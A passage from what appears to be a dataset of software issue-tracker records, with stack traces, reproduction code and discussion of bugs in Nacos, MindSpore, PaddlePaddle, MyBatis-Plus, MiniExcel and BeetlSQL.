org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:887) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:791) ... 33 common frames omitted Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.UnsatisfiedLinkError: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: dlopen(/private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib, 1): no suitable image found. Did find: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture at org.springframework.beans.BeanUtils.instantiateClass(BeanUtils.java:225) at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:117) at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:311) ... 47 common frames omitted Caused by: java.lang.UnsatisfiedLinkError: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: dlopen(/private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib, 1): no suitable image found. Did find: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture at java.lang.ClassLoader$NativeLibrary.load(Native Method) at java.lang.ClassLoader.loadLibrary0(ClassLoader.java:1950) at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1832) at java.lang.Runtime.load0(Runtime.java:811) at java.lang.System.load(System.java:1088) at org.rocksdb.NativeLibraryLoader.loadLibraryFromJar(NativeLibraryLoader.java:78) at org.rocksdb.NativeLibraryLoader.loadLibrary(NativeLibraryLoader.java:56) at org.rocksdb.RocksDB.loadLibrary(RocksDB.java:64) at org.rocksdb.RocksDB.&lt;clinit&gt;(RocksDB.java:35) at com.alipay.sofa.jraft.storage.impl.RocksDBLogStorage.&lt;clinit&gt;(RocksDBLogStorage.java:75) at com.alipay.sofa.jraft.core.DefaultJRaftServiceFactory.createLogStorage(DefaultJRaftServiceFactory.java:50) at com.alipay.sofa.jraft.core.NodeImpl.initLogStorage(NodeImpl.java:571) at com.alipay.sofa.jraft.core.NodeImpl.init(NodeImpl.java:991) at com.alipay.sofa.jraft.core.NodeImpl.init(NodeImpl.java:138) at com.alipay.sofa.jraft.RaftServiceFactory.createAndInitRaftNode(RaftServiceFactory.java:47) at com.alipay.sofa.jraft.RaftGroupService.start(RaftGroupService.java:129) at com.alibaba.nacos.core.distributed.raft.JRaftServer.createMultiRaftGroup(JRaftServer.java:268) at com.alibaba.nacos.core.distributed.raft.JRaftProtocol.addRequestProcessors(JRaftProtocol.java:163) at com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl.&lt;init&gt;(PersistentClientOperationServiceImpl.java:94) at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:423) at org.springframework.beans.BeanUtils.instantiateClass(BeanUtils.java:212) ... 49 common frames omitted 2021-07-26 17:56:26.128 WARN 7403 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start close 2021-07-26 17:56:26.129 WARN 7403 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start to shutdown this watcher which is watch : /Users/wangwei/nacos/data/loader 2021-07-26 17:56:26.129 WARN 7403 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start to shutdown this watcher which is watch : /Users/wangwei/nacos/data/tps 2021-07-26 17:56:26.129 WARN 7403 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start to shutdown this watcher which is watch : /Users/wangwei/nacos/conf 2021-07-26 17:56:26.129 WARN 7403 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] already closed 2021-07-26 17:56:26.129 WARN 7403 --- [ main] c.a.nacos.common.notify.NotifyCenter : [NotifyCenter] Start destroying Publisher 2021-07-26 17:56:26.129 WARN 7403 --- [ main] c.a.nacos.common.notify.NotifyCenter : [NotifyCenter] Destruction of the end 2021-07-26 17:56:26.130 ERROR 7403 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos failed to start, please see /Users/wangwei/nacos/logs/nacos.log for more details. 2021-07-26 17:56:26.151 INFO 7403 --- [ main] ConditionEvaluationReportLoggingListener : Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2021-07-26 17:56:26.171 ERROR 7403 --- [ main] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'instanceOperatorClientImpl' defined in URL [jar:file:/Users/wangwei/maven_repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/InstanceOperatorClientImpl.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'clientOperationServiceProxy' defined in URL [jar:file:/Users/wangwei/maven_repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/v2/service/ClientOperationServiceProxy.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'persistentClientOperationServiceImpl' defined in URL [jar:file:/Users/wangwei/maven_repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/v2/service/impl/PersistentClientOperationServiceImpl.class]: Bean instantiation via constructor failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.UnsatisfiedLinkError: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: dlopen(/private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib, 1): no suitable image found. Did find: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:800) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:229) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1354) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:564) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:944) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:145) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:754) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:434) at org.springframework.boot.SpringApplication.run(SpringApplication.java:338) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1343) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1332) at com.alibaba.nacos.DigitalNacosApplication.main(DigitalNacosApplication.java:39) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'clientOperationServiceProxy' defined in URL [jar:file:/Users/wangwei/maven_repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/v2/service/ClientOperationServiceProxy.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'persistentClientOperationServiceImpl' defined in URL [jar:file:/Users/wangwei/maven_repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/v2/service/impl/PersistentClientOperationServiceImpl.class]: Bean instantiation via constructor failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.UnsatisfiedLinkError: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: dlopen(/private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib, 1): no suitable image found. Did find: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:800) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:229) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1354) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:564) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:887) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:791) ... 19 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'persistentClientOperationServiceImpl' defined in URL [jar:file:/Users/wangwei/maven_repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/v2/service/impl/PersistentClientOperationServiceImpl.class]: Bean instantiation via constructor failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.UnsatisfiedLinkError: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: dlopen(/private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib, 1): no suitable image found. Did find: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:315) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:296) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1354) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:564) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:887) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:791) ... 33 common frames omitted Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.UnsatisfiedLinkError: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: dlopen(/private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib, 1): no suitable image found. Did find: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture at org.springframework.beans.BeanUtils.instantiateClass(BeanUtils.java:225) at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:117) at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:311) ... 47 common frames omitted Caused by: java.lang.UnsatisfiedLinkError: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: dlopen(/private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib, 1): no suitable image found. Did find: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture at java.lang.ClassLoader$NativeLibrary.load(Native Method) at java.lang.ClassLoader.loadLibrary0(ClassLoader.java:1950) at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1832) at java.lang.Runtime.load0(Runtime.java:811) at java.lang.System.load(System.java:1088) at org.rocksdb.NativeLibraryLoader.loadLibraryFromJar(NativeLibraryLoader.java:78) at org.rocksdb.NativeLibraryLoader.loadLibrary(NativeLibraryLoader.java:56) at org.rocksdb.RocksDB.loadLibrary(RocksDB.java:64) at org.rocksdb.RocksDB.&lt;clinit&gt;(RocksDB.java:35) at com.alipay.sofa.jraft.storage.impl.RocksDBLogStorage.&lt;clinit&gt;(RocksDBLogStorage.java:75) at com.alipay.sofa.jraft.core.DefaultJRaftServiceFactory.createLogStorage(DefaultJRaftServiceFactory.java:50) at com.alipay.sofa.jraft.core.NodeImpl.initLogStorage(NodeImpl.java:571) at com.alipay.sofa.jraft.core.NodeImpl.init(NodeImpl.java:991) at com.alipay.sofa.jraft.core.NodeImpl.init(NodeImpl.java:138) at com.alipay.sofa.jraft.RaftServiceFactory.createAndInitRaftNode(RaftServiceFactory.java:47) at com.alipay.sofa.jraft.RaftGroupService.start(RaftGroupService.java:129) at com.alibaba.nacos.core.distributed.raft.JRaftServer.createMultiRaftGroup(JRaftServer.java:268) at com.alibaba.nacos.core.distributed.raft.JRaftProtocol.addRequestProcessors(JRaftProtocol.java:163) at com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl.&lt;init&gt;(PersistentClientOperationServiceImpl.java:94) at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:423) at org.springframework.beans.BeanUtils.instantiateClass(BeanUtils.java:212) ... 49 common frames omitted"
"[CT][MS]top cell with input Parameter, export mindir fail","Cell输入Parameter, 导出mindir失败 / 硬件环境: /device ascend/GPU/CPU : -- MindSpore version :644a296e master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph python test_export_assign.py pass Traceback (most recent call last): File ""test_export_assign.py"", line 37, in export(net, variable, value, file_name='Assign', file_format='MINDIR') File ""/root/miniconda3/envs/ctj/lib/python3.7/site-packages/mindspore/train/serialization.py"", line 928, in export _export(net, file_name, file_format, *inputs, **kwargs) File ""/root/miniconda3/envs/ctj/lib/python3.7/site-packages/mindspore/train/serialization.py"", line 955, in _export _save_mindir(net, file_name, *inputs, **kwargs) File ""/root/miniconda3/envs/ctj/lib/python3.7/site-packages/mindspore/train/serialization.py"", line 1153, in _save_mindir save_together = _save_together(net_dict, model) File ""/root/miniconda3/envs/ctj/lib/python3.7/site-packages/mindspore/train/serialization.py"", line 1203, in _save_together .format(param_proto.name)) ValueError: The parameter '3_1_construct_wrapper.3:variable' in the graph should also be defined in the network.   <code>: from mindspore.common import Tensor import mindspore from mindspore.nn import Cell from mindspore.train.serialization import export from mindspore import ops import mindspore.ops.operations as P import numpy as np class Net(Cell): def __init__(self): super().__init__() self.assign = ops.Assign() def construct(self, variable, value): output = self.assign(variable, value) return output variable = mindspore.Parameter(Tensor([1.0], mindspore.float32), name=""variable"") net = Net() value = Tensor([2.0], mindspore.float32) export(net, variable, value, file_name='Assign', file_format='MINDIR') out = net(variable, value)"
Demangle exception call stack for PADDLE_ENFORCE,"fix #3462:Mobilenet neon acceleration After this PR, if we meet some exceptions like this: Call Stack:   <code>: TEST(ENFORCE_USER_DEFINED_CLASS, EQ) { Dims a{{1, 3, 3, 4}}, b{{1, 2, 3, 4}}; PADDLE_ENFORCE_EQ(a, b); } : [ RUN ] ENFORCE_USER_DEFINED_CLASS.EQ 68: unknown file: Failure 68: C++ exception with description ""enforce a == b failed, [1, 3, 3, 4] != [1, 2, 3, 4] 68: at [/Users/liaogang/baidu/Paddle/paddle/platform/enforce_test.cc:210] 68: PaddlePaddle Call Stacks: 68: 0 0x1051a58e0p paddle::platform::EnforceNotMet::EnforceNotMet(std::exception_ptr, char const*, int) + 768 68: 1 0x1051a4f79p ENFORCE_USER_DEFINED_CLASS_EQ_Test::TestBody() + 377 68: 2 0x1051b957bp void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) + 75 68: 3 0x1051b94cep testing::Test::Run() + 254 68: 4 0x1051ba4e2p testing::TestInfo::Run() + 306 68: 5 0x1051bad73p testing::TestCase::Run() + 275 68: 6 0x1051c2e59p testing::internal::UnitTestImpl::RunAllTests() + 1241 68: 7 0x1051c27c0p bool testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) + 80 68: 8 0x1051c271ep testing::UnitTest::Run() + 174 68: 9 0x1051d40d1p main + 49 68: 10 0x7fffa9e0c235p start + 1 68: 11 0x1p "" thrown in the test body. 68: [ FAILED ] ENFORCE_USER_DEFINED_CLASS.EQ (0 ms)"
使用LambdaUpdateWrapper更新时自动填充updateFill无效,"当前使用版本 3.3.1.tmp 使用或者不添加实体直接set属性时，自动填充方法无效，只有当中设置了实体才会进入方法中。 实体类 业务方法 MetaObjectHandler   <code>: LambdaUpdateWrapper UpdateWrapper updateFill UpdateWrapper updateFill /** * 创建人 */ @TableField(fill = FieldFill.INSERT) private String createBy; /** * 创建时间 */ @TableField(fill = FieldFill.INSERT) private LocalDateTime createTime; /** * 更新人 */ @TableField(fill = FieldFill.INSERT_UPDATE) private String updateBy; /** * 更新时间 */ @TableField(fill = FieldFill.INSERT_UPDATE) private LocalDateTime updateTime; @Test void updateTest() { // 无效 userBaseService.update(new UpdateWrapper&lt;UserBaseEntity&gt;().eq(""id"", 1).set(""username"", ""UpdateWrapper"")); // 无效 LambdaUpdateWrapper&lt;UserBaseEntity&gt; wrapper = Wrappers.&lt;UserBaseEntity&gt;lambdaUpdate() .eq(UserBaseEntity::getId, 1L) .set(UserBaseEntity::getUsername, ""LambdaUpdateWrapper""); userBaseService.update(wrapper); // 有效 UserBaseEntity whereUser = new UserBaseEntity(); whereUser.setId(2L); UserBaseEntity user = new UserBaseEntity(); user.setAccount(""15911223344""); user.setPassword(""123456""); user.setUsername(""whereUser""); userBaseService.update(user, Wrappers.update(whereUser)); } @Override public void insertFill(MetaObject metaObject) { String by = ""insert""; LocalDateTime now = LocalDateTime.now(); if (metaObject.hasSetter(""createTime"") &amp;&amp; getFieldValByName(""createTime"", metaObject) == null) strictInsertFill(metaObject, ""createTime"", LocalDateTime.class, now); if (metaObject.hasSetter(""updateTime"") &amp;&amp; getFieldValByName(""updateTime"", metaObject) == null) strictInsertFill(metaObject, ""updateTime"", LocalDateTime.class, now); if (metaObject.hasSetter(""createBy"") &amp;&amp; getFieldValByName(""createBy"", metaObject) == null) strictInsertFill(metaObject, ""createBy"", String.class, by); if (metaObject.hasSetter(""updateBy"") &amp;&amp; getFieldValByName(""updateBy"", metaObject) == null) strictInsertFill(metaObject, ""updateBy"", String.class, by); } @Override public void updateFill(MetaObject metaObject) { if (metaObject.hasSetter(""updateTime"") &amp;&amp; getFieldValByName(""updateTime"", metaObject) == null) strictUpdateFill(metaObject, ""updateTime"", LocalDateTime.class, LocalDateTime.now()); if (metaObject.hasSetter(""updateBy"") &amp;&amp; getFieldValByName(""updateBy"", metaObject) == null) strictUpdateFill(metaObject, ""updateBy"", String.class, ""update""); }"
【FQA】如何将查询结果转为 DataTable,"提醒 : 不建议使用，因为DataTable会将数据，失去MiniExcel低内存消耗功能。 代码 :   <code>: 全载入内存 var rows = MiniExcel.Query(path,true); var dt = new DataTable(); var first = true; foreach (IDictionary&lt;string,object&gt; row in rows) { if(first) { foreach (var key in row.Keys) { var type = row[key]?.GetType()??typeof(string); dt.Columns.Add(key,type); } first =false; } dt.Rows.Add(row.Values.ToArray()); }"
集成springboot项目后，mysql类型数据库，报错未发现主键,"建表sql： CREATE TABLE ( int(11) NOT NULL AUTO_INCREMENT COMMENT '分类ID', varchar(50) DEFAULT NULL COMMENT '分类名称', varchar(255) DEFAULT NULL COMMENT '添加者', varchar(255) DEFAULT NULL COMMENT '编辑者', int(11) DEFAULT NULL COMMENT '是否删除（1：存在；0：删除）', timestamp DEFAULT NULL COMMENT '创建时间', timestamp DEFAULT NULL COMMENT '更新时间', PRIMARY KEY () ) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8; 实体类： @ Data @Table(name = ""dmc_kettle_category"") public class KettleCategory implements Serializable { private static final long serialVersionUID = 1L; @ApiModelProperty(value = ""分类ID"") private Integer categoryId; @ApiModelProperty(value = ""分类名称"") private String categoryName; @ApiModelProperty(value = ""添加者"") private String addUser; @ApiModelProperty(value = ""是否删除（1：存在；0：删除）"") private Integer delFlag; @ApiModelProperty(value = ""编辑者"") private Integer editUser; @ApiModelProperty(value = ""创建时间"") private Date createTime; @ApiModelProperty(value = ""更新时间"") private Date updateTime; } 配置文件： #beetlsql数据源参数配置 beetlsql.sqlPath=/sql beetlsql.basePackage=com.sugon.dmp.kettle.mapper beetlsql.daoSuffix=Mapper beetlsql.dbStyle=org.beetl.sql.core.db.MySqlStyle beetlsql.nameConversion=org.beetl.sql.core.UnderlinedNameConversion beetl-beetlsql.dev=true 报错信息： org.beetl.sql.core.BeetlSQLException: 主键未发现,com.sugon.dmp.kettle.pojo.po.KettleCategory,检查数据库表定义或者NameConversion at org.beetl.sql.core.db.AbstractDBStyle.checkId(AbstractDBStyle.java:859) at org.beetl.sql.core.db.AbstractDBStyle.appendIdCondition(AbstractDBStyle.java:785) at org.beetl.sql.core.db.AbstractDBStyle.genSelectById(AbstractDBStyle.java:89) at org.beetl.sql.core.SQLManager.getScript(SQLManager.java:372) at org.beetl.sql.core.SQLManager.single(SQLManager.java:717) at org.beetl.sql.core.mapper.internal.SingleAmi.call(SingleAmi.java:17) at org.beetl.sql.core.mapper.MapperJavaProxy.invoke(MapperJavaProxy.java:168) at org.beetl.sql.core.mapper.MapperJava8Proxy.invoke(MapperJava8Proxy.java:92) at com.sun.proxy.$Proxy120.single(Unknown Source) at com.sugon.dmp.kettle.service.impl.KettleCategoryServiceImpl.getQuartz(KettleCategoryServiceImpl.java:51) at com.sugon.dmp.kettle.controller.KettleCategoryController.getQuartz(KettleCategoryController.java:92) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:189) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:102) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:800) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1038) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1005) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:897) at javax.servlet.http.HttpServlet.service(HttpServlet.java:634) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:882) at javax.servlet.http.HttpServlet.service(HttpServlet.java:741) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:123) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at 